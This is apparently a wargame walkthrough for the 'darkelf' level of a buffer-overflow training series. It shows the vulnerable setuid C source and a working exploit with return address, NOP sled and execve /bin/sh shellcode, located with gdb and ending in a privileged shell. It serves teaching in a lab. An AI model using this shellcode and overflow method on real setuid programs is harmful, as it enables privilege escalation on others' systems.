# Level6

## This level's goal
- LEVEL6 (wolfman -> darkelf) : check length of argv[1] + egghunter + bufferhunter

***

```
[wolfman@localhost wolfman]$ bash2

[wolfman@localhost wolfman]$ ls -l
total 20
-rwsr-sr-x    1 darkelf  darkelf     12655 Feb 26  2010 darkelf
-rw-r--r--    1 root     root          721 Mar 29  2010 darkelf.c

[wolfman@localhost wolfman]$ cat darkelf.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkelf
        - egghunter + buffer hunter + check length of argv[1]
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```

In the code, there is the limit argument in the argv[1] which means you need to use argv[2] in this level.

The payload will be dummy(44bytes) + RET(4bytes) in argv[1] and NOP + Shell code in argv[2].

```
[wolfman@localhost wolfman]$ ulimit -s unlimited
[wolfman@localhost wolfman]$ gcc darkelf.c -o darkelf2
[wolfman@localhost wolfman]$ ./darkelf2 `python -c 'print "\x90"*44+"\xff\xff\xff\xbf"'` `python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
ÿÿÿ¿
Segmentation fault (core dumped)
[wolfman@localhost wolfman]$ gdb -c core -q
Core was generated by `./darkelf2 ÿÿÿ¿ '.
Program terminated with signal 11, Segmentation fault.
#0  0xbfffffff in ?? ()
(gdb) x/200x $esp
0xbffffc00:     0x00000000      0x61642f2e      0x6c656b72      0x90003266
0xbffffc10:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc20:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc30:     0x90909090      0x90909090      0xff909090      0x00bfffff
0xbffffc40:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffc50:     0x90909090      0x6850c031      0x68732f2f      0x69622f68
0xbffffc60:     0x50e3896e      0x89e18953      0xcd0bb0c2      0x00000080

[wolfman@localhost wolfman]$ ./darkelf  `python -c 'print "\x90"*44+"\x40\xfc\xff\xbf"'` `python -c 'print "\x90"*20+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
@üÿ¿
bash$ my-pass
euid = 506
kernel crashed
```
